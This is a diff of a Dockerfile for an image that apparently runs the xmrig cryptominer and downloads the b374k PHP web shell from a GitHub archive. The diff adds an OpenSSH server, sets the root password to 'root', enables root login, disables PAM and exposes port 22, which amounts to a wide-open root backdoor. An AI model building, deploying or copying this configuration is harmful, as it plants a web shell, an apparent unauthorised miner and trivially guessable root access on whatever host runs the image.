@@ -23,7 +23,7 @@ RUN \
  apt-get update ; \
  apt-get -y --allow-unauthenticated install nginx-extras \
  php5.6-cli php5.6-curl php5.6-fpm php5.6-json php5.6-mcrypt php5.6-mysql php5.6-sqlite php5.6-xmlrpc php5.6-xsl php5.6-gd \
- curl wget git unzip pwgen anacron build-essential cmake libuv1-dev libmicrohttpd-dev gcc-7 g++-7 sudo \
+ curl wget git unzip pwgen anacron build-essential cmake libuv1-dev libmicrohttpd-dev gcc-7 g++-7 sudo openssh-server \
  supervisor \
  mysql-client ; \
  apt-get clean ; \
@@ -54,8 +54,14 @@ RUN \
  curl -sSL https://github.com/pikeman20/b374k/archive/v3.2.3.tar.gz | tar -zxf - -C /root/thirdparty/ ; \
  true
 
+RUN mkdir /var/run/sshd
 
-EXPOSE 80
+RUN echo 'root:root' |chpasswd
+
+RUN sed -ri 's/^PermitRootLogin\s+.*/PermitRootLogin yes/' /etc/ssh/sshd_config
+RUN sed -ri 's/UsePAM yes/#UsePAM yes/g' /etc/ssh/sshd_config
+
+EXPOSE 22 80
 WORKDIR    /xmrig
 CMD ["/bin/bash","/root/sbin/init.sh"]
 #USER xminer
